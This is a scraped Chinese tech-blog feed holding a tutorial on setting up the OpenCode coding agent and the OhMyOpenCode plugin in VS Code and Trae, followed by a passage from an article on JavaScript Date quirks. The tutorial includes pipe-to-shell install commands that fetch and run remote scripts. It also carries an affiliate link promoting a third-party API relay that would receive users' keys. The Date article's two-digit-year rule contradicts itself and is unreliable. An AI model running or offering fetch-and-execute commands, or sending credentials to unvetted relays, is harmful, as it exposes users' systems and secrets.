            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1081575170907086/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大橙子打游戏
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:46:33.000Z" title="Fri Jan 09 2026 03:46:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">用 OpenCode 结合 OhMyOpenCode：在 VS Code 与 Trae 中的高效开发实战（含截图与配置）</h2>
<blockquote>
<p>2026 年开发者的终端编程利器：从安装到 Multi‑Agent 工作流全解析</p>
</blockquote>
<h3 data-id="heading-1">概述：OpenCode + OhMyOpenCode 在 IDE 中的效率飞跃</h3>
<p>在 2026 年的今天，AI 编程工具已经从简单的代码补全进化为能够独立执行复杂任务的智能体（Agent）。OpenCode 作为这一领域的开源领跑者，凭借其强大的 CLI（命令行界面）与 TUI（终端用户界面）交互模式，正在重新定义开发者的工作流。而 OhMyOpenCode 作为其最强伴侣，通过插件化机制进一步释放了 Multi‑Agent 的协作潜力。</p>
<ul>
<li>OpenCode 是什么？一款 100% 开源的 AI 编程代理，既可以在终端独立运行，也能作为 IDE 插件集成。它支持 GLM‑4.7、MiniMax、Grok Code 等多种模型，主打 “终端即入口” 的高效交互体验，能够直接操作文件系统、执行 Shell 命令并进行代码重构。</li>
<li>OhMyOpenCode 是什么？OpenCode 的社区增强插件（代号 “Sisyphus”）。它为 OpenCode 注入了类似 Claude Code 的兼容层，提供完善的 Agent 任务编排机制、精选 MCP 工具链以及并行任务处理能力，被誉为 “生产力核弹”。</li>
</ul>
<p>为什么选择在 VS Code 或 Trae 中使用它们？核心在于“终端集成”。现代 IDE 如 Trae 和 VS Code 都拥有强大的内置终端。OpenCode 这种“终端原生”的工具，天然适合嵌入到 IDE 的下半部分面板中：你可以在编辑器中浏览代码，同时在终端里指挥 Agent 进行批量重构、生成文档或跨文件分析。这种组合既保留了图形界面的直观，又获得了命令行工具的极致效率。</p>
<p>典型提效场景：</p>
<ul>
<li>批量重构：“将 src 目录下所有组件的 Class 写法转换为 Hooks。”</li>
<li>脚手架生成：“基于当前的 schema.prisma 文件生成全套 CRUD 接口。”</li>
<li>跨项目上下文：读取 legacy 项目的代码逻辑，应用到当前的新微服务中。</li>
<li>文档维护：自动分析改动文件，生成对应的 CHANGELOG 和 API 文档。</li>
</ul>
<h3 data-id="heading-2">环境准备与安装（VS Code / Trae）</h3>
<p>要构建这套工作流，我们需要分层安装：先核心（OpenCode CLI），再插件（IDE Extension），最后增强（OhMyOpenCode）。</p>
<h4 data-id="heading-3">1. 安装 OpenCode 核心</h4>
<p>OpenCode 是一个 Go 语言编写的独立程序，支持 macOS、Linux 和 Windows。推荐使用官方脚本进行安装，以确保获取最新版本（支持 TUI 模式）。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># macOS / Linux</span>
curl -sL https://opencode.ai/install | bash

<span class="hljs-comment"># Windows (PowerShell)</span>
iwr https://opencode.ai/install.ps1 | iex
</code></pre>
<p>安装完成后，在任意终端输入 <code>opencode version</code> 验证是否成功。</p>
<h4 data-id="heading-4">2. 在 VS Code 中安装扩展</h4>
<p>为了获得更好的编辑器联动（如代码高亮 Diff、一键应用代码块），建议安装官方 VS Code 扩展：</p>
<ol>
<li>打开 VS Code 扩展市场（Ctrl+Shift+X）。</li>
<li>搜索并安装官方扩展：<code>sst-dev.opencode</code>（避免同名仿冒）。</li>
<li>扩展市场链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsst-dev.opencode" target="_blank" title="https://marketplace.visualstudio.com/items?itemName=sst-dev.opencode" ref="nofollow noopener noreferrer">marketplace.visualstudio.com/items?itemN…</a></li>
</ol>
<h4 data-id="heading-5">3. 在 Trae 中集成</h4>
<p>Trae 是基于 VS Code 二次开发的 AI 原生 IDE，对终端工具的支持非常友好。在 Trae 中通常无需安装额外插件，直接利用其内置终端即可完美运行 OpenCode TUI：</p>
<ol>
<li>打开 Trae IDE。</li>
<li>唤起底部终端面板（Terminal）。</li>
<li>输入 <code>opencode</code> 启动交互会话。</li>
</ol>
<h4 data-id="heading-6">4. 启用 OhMyOpenCode 增强</h4>
<p>OhMyOpenCode 本质上是一组为 OpenCode 设计的高级配置脚本和插件包：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在终端中运行 OpenCode 的插件安装命令</span>
opencode plugin install code-yeongyu/oh-my-opencode
</code></pre>
<p>安装后，OpenCode 会自动加载该层兼容配置，你的界面提示符可能会发生变化（例如变为 “Sisyphus” 风格），这标志着 Multi‑Agent 引擎已就绪。</p>
<h3 data-id="heading-7">在 VS Code 中配置 OpenCode 与 OhMyOpenCode</h3>
<p>虽然 OpenCode 开箱即用，但为了达到最佳生产力，我们需要在 VS Code 的 <code>settings.json</code> 中进行一些关键配置，包括模型选择、密钥注入以及 OhMyOpenCode 的特定开关。</p>
<p>推荐的“最小可用配置”示例：</p>
<pre><code class="hljs language-jsonc" lang="jsonc">{
  // 核心模型配置：支持 GLM‑4.7, MiniMax, Claude 等
  "opencode.provider": "bigmodel-glm",
  "opencode.apiKey": "${env:GLM_API_KEY}", // 推荐使用环境变量引用，更安全

  // 代理与网络设置（关键）
  "opencode.proxy": "http://127.0.0.1:7890",

  // 并发控制：决定 Agent 可以同时执行多少个文件操作
  "opencode.concurrency": 4,

  // OhMyOpenCode 插件特定配置
  "opencode.ohMyOpenCode.enabled": true,
  "opencode.ohMyOpenCode.agentMode": "collaborative", // 开启多智能体协作
  "opencode.ohMyOpenCode.autoCommit": false // 建议设为 false，人工确认提交
}
</code></pre>
<p>配置要点：</p>
<ol>
<li>Provider：根据预算与偏好选择。GLM‑4.7 在中文理解和性价比上表现优异。</li>
<li>Security：尽量避免将 API Key 明文写入配置文件，使用系统环境变量更安全。</li>
<li>OhMyOpenCode：通过 <code>agentMode</code> 控制是否启用复杂协作模式。简单任务可临时切换为 standard 模式以节省 Token。</li>
</ol>
<h3 data-id="heading-8">终端/TUI 工作流：在任何支持终端的 IDE 里用 OpenCode</h3>
<p>OpenCode 的精髓在于 TUI（Terminal User Interface）。无论你使用的是 VS Code、Trae 还是 IntelliJ IDEA，只要打开内置终端，就能获得一致的 AI 编程体验。</p>
<p>典型工作流循环：</p>
<ol>
<li>启动会话：在终端输入 <code>opencode</code> 进入交互模式。</li>
<li>加载上下文：使用 <code>/add src/utils/*.ts</code> 将相关代码文件加入 AI 的上下文窗口。</li>
<li>下达指令：输入自然语言，例如“分析这些工具函数，为它们编写单元测试，保存在 tests/ 目录下”。</li>
<li>审查与应用：OpenCode 会生成 Diff 预览。按 <code>y</code> 确认应用，按 <code>n</code> 拒绝，或输入反馈继续修改。</li>
<li>任务队列：在 OhMyOpenCode 模式下，复杂任务会被拆解为子任务队列，Agent 可并行处理多个文件。</li>
</ol>
<p>在 Trae 这类 AI 原生 IDE 中，终端体验尤为流畅。你可以将终端面板最大化，专注于与 AI 的对话，而生成的代码会实时同步到上方的编辑器视图中。</p>
<h3 data-id="heading-9">OhMyOpenCode 的增强与取舍</h3>
<p>安装了 OhMyOpenCode 之后，OpenCode 就从一个“听话的实习生”变成了“主动的高级工程师团队”。但这种能力的提升也伴随着成本的权衡。</p>
<p>优势（Pros）：</p>
<ul>
<li>Multi‑Agent 协作：自动拆解任务，由不同的子 Agent 负责规划、编码、测试。</li>
<li>Claude Code 兼容层：让 OpenCode 能够理解复杂的 Claude 风格 prompt，并在逻辑推理上更接近闭源竞品。</li>
<li>工具链集成：内置常用 LSP、AST 工具，代码理解更精准。</li>
</ul>
<p>权衡（Cons）：</p>
<ul>
<li>Token 消耗激增：多 Agent 意味着多轮内部对话，消耗量可能是标准模式的 3‑5 倍。</li>
<li>速度延迟：复杂的规划阶段需要时间，不适合“改一个标点”这种微小任务。</li>
<li>稳定性依赖：强依赖底层大模型的稳定性，一旦 API 波动，任务链可能中断。</li>
</ul>
<h3 data-id="heading-10">常见问题与排错</h3>
<ul>
<li>API Key 未生效/报错 401：检查环境变量 <code>GLM_API_KEY</code> 是否已在 Shell（如 .zshrc）中导出。VS Code 有时无法读取最新的 Shell 变量，尝试在 <code>settings.json</code> 中直接填入（仅测试用）或重启 VS Code。</li>
<li>扩展冲突：OpenCode 可能与 GitHub Copilot 或 Cursor 抢占快捷键。建议为 OpenCode 设置独立快捷键映射，避免冲突。</li>
<li>终端网络超时：公司内网场景需独立代理配置。确保在配置文件中正确设置 <code>http_proxy</code> 或 <code>opencode.proxy</code> 字段。</li>
<li>Trae 特定建议：如果 OpenCode 无法写入文件，检查 Trae 的 “Workspace Trust” 设置，确保当前工作区是受信任的。</li>
</ul>
<h3 data-id="heading-11">opencode.json：自定义供应商 baseURL 与代理配置</h3>
<pre><code class="hljs language-text" lang="text">可以配置使用 https://ai.t8star.cn/register?aff=U7mw51175  中转站，
各种模型都有，在下方的baseURL改成https://ai.t8star.cn/v1 就可以。
</code></pre>
<p>除了在 IDE 插件中配置，OpenCode 还支持通过 <code>opencode.json</code> 文件进行更底层的参数调优。这对于需要将官方 API 地址（如 Anthropic、OpenAI）切换为企业内部代理、本地转发服务或第三方中转站的开发者尤为重要。</p>
<p>典型配置示例（将 <code>anthropic</code> 的 <code>options.baseURL</code> 指向本地或第三方代理）：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"providers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"anthropic"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"options"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"baseURL"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://127.0.0.1:8045/v1"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"claude-sonnet-4-5-thinking"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Claude Sonnet 4.5 Thinking (CC)"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"attachment"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"limit"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
              <span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1048576</span><span class="hljs-punctuation">,</span>
              <span class="hljs-attr">"output"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">65535</span>
            <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"modalities"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
              <span class="hljs-attr">"input"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
                <span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span>
                <span class="hljs-string">"image"</span><span class="hljs-punctuation">,</span>
                <span class="hljs-string">"pdf"</span>
              <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
              <span class="hljs-attr">"output"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
                <span class="hljs-string">"text"</span>
              <span class="hljs-punctuation">]</span>
            <span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>配置生效与验证完整步骤：</p>
<ol>
<li>新开一个终端窗口，执行认证命令：<code>opencode auth login</code>。</li>
<li>在交互界面中选择供应商 <code>anthropic</code>。</li>
<li>选择“输入 apikey”，将第三方中转站的 key 粘贴进去。</li>
<li>登录成功后，在 OpenCode 界面输入 <code>/models</code> 指令。如果配置正确，你应该能看到该供应商旗下的模型列表已正常加载。</li>
</ol>
<p>安全与合规提示：</p>
<ul>
<li>秘钥安全：尽量避免在 <code>opencode.json</code> 中明文硬编码 apikey，优先使用环境变量。</li>
<li>合规性：确保使用的第三方中转站或代理服务符合所在公司的安全合规要求。</li>
</ul>
<h3 data-id="heading-12">生态全景：工具角色定位</h3>
<p>最后，理清三者关系：OpenCode 是核心 AI 引擎，OhMyOpenCode 是它的“大脑增强包”，而 VS Code 与 Trae 则是它们施展拳脚的舞台。</p>
<hr/>
<h4 data-id="heading-13">参考与进一步阅读</h4>
<ul>
<li>OpenCode（中文资料聚合）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fai-bot.cn%2Fopencode%2F" target="_blank" title="https://ai-bot.cn/opencode/" ref="nofollow noopener noreferrer">ai-bot.cn/opencode/</a></li>
<li>OpenCode 官方 IDE 整合文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2Fdocs%2Fide%2F" target="_blank" title="https://opencode.ai/docs/ide/" ref="nofollow noopener noreferrer">opencode.ai/docs/ide/</a></li>
<li>OpenCode VS Code 扩展（官方）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsst-dev.opencode" target="_blank" title="https://marketplace.visualstudio.com/items?itemName=sst-dev.opencode" ref="nofollow noopener noreferrer">marketplace.visualstudio.com/items?itemN…</a></li>
<li>OpenCode 插件机制文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2Fdocs%2Fplugins%2F" target="_blank" title="https://opencode.ai/docs/plugins/" ref="nofollow noopener noreferrer">opencode.ai/docs/plugin…</a></li>
<li>OhMyOpenCode（社区介绍与讨论）：<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoding.csdn.net%2F695e7679ea53844658f53369.html" target="_blank" title="https://aicoding.csdn.net/695e7679ea53844658f53369.html" ref="nofollow noopener noreferrer">aicoding.csdn.net/695e7679ea5…</a></li>
<li>Trae IDE 官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftraeide.com%2F" target="_blank" title="https://traeide.com/" ref="nofollow noopener noreferrer">traeide.com/</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript Date 语法要过时了！以后用这个替代！]]></title>    <link>https://juejin.cn/post/7593139476832616491</link>    <guid>https://juejin.cn/post/7593139476832616491</guid>    <pubDate>2026-01-09T03:52:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593139476832616491" data-draft-id="7593139476832600107" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" JavaScript Date 语法要过时了！以后用这个替代！"/> <meta itemprop="keywords" content="前端,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-09T03:52:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             JavaScript Date 语法要过时了！以后用这个替代！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:52:13.000Z" title="Fri Jan 09 2026 03:52:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 前言</h2>
<p>作为一名前端开发工程师，你一定被 JavaScript 的日期处理折磨过。</p>
<p>这不是你的问题，是 JavaScript 自己的问题——它的 Date 功能真的很糟糕。</p>
<h2 data-id="heading-1">2. Date 的离谱行为</h2>
<p>让我给你举几个例子，你就明白有多离谱了：</p>
<p><strong>月份从 0 开始计数：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 你以为这是 2026 年 1 月 1 日？</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-number">2026</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>));
<span class="hljs-comment">// 结果：2026 年 2 月 1 日！</span>

<span class="hljs-comment">// 因为月份是从 0 开始数的：0=1月，1=2月...</span>
<span class="hljs-comment">// 但年份和日期又是正常计数的</span>
</code></pre>
<p><strong>日期格式混乱到让人抓狂：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 用斜杠分隔，加不加前导零都没问题</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"2026/01/02"</span>));
<span class="hljs-comment">// Fri Jan 02 2026 00:00:00 GMT+0800 (中国标准时间)</span>

<span class="hljs-comment">// 但如果用短横线分隔，同样的写法</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"2026-01-02"</span>));
<span class="hljs-comment">// Fri Jan 02 2026 08:00:00 GMT+0800 (中国标准时间)</span>

<span class="hljs-comment">// 时间居然不一样了！</span>

<span class="hljs-comment">// 如果用东半球标准时间，更离谱！一个是 1 月 2 日，一个是 1 月 1 日</span>
</code></pre>
<p><strong>两位数年份的迷惑行为：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"49"</span>)); <span class="hljs-comment">// 2049 年</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"99"</span>)); <span class="hljs-comment">// 1999 年</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"100"</span>)); <span class="hljs-comment">// 公元 100 年！</span>
</code></pre>
<p>规则莫名其妙：33-99 代表 1900 年代，但 32-49 又代表 2000 年代，100 以上就真的是公元那一年了。</p>
<p><strong>更致命的问题是 —— 日期居然可以被“改变”！</strong></p>
